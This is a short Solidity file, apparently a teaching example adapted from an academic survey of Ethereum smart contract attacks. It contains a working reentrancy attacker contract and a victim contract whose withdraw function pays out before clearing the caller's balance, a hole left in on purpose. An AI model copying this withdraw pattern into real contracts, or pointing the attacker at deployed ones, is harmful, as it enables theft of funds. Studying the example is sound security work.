/*
 * Example taken from the paper by N. Atzei, M. Bartoletti, and T. Cimoli, “A Survey of Attacks on Ethereum Smart Contracts (SoK),” in Principles of Security and Trust, 2017                                                                                 
 * http://blockchain.unica.it/projects/ethereum-survey/attacks.html#simpledao
 *
 * Modified for solidity 0.5 compatibility and removed unecessary
 * functions/variables.
 */

pragma solidity ^0.8.17;

contract Attacker {
    Victim public victim;

    constructor(address _victimContractAddress) {
        victim = Victim(_victimContractAddress);
    }

    receive() external payable {
        if(address(victim).balance > 0) {
            victim.withdraw();
        }
    }

    function attack() public payable {
        victim.addBalance{value: msg.value}();
        victim.withdraw();
    }
}

contract Victim {

    mapping(address => uint) public balances;
    event CurrentBalance(uint balance);
    function withdraw() public {
        require(balances[msg.sender] > 0);
        (bool sent,) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent, "Failed to send ether");
        balances[msg.sender] = 0;
    }

    function addBalance() public payable {
        balances[msg.sender] += msg.value;
        emit CurrentBalance(balances[msg.sender]);
    }

    function getBalance(address _address) public view returns (uint) {
        return balances[address(_address)];
    }
}
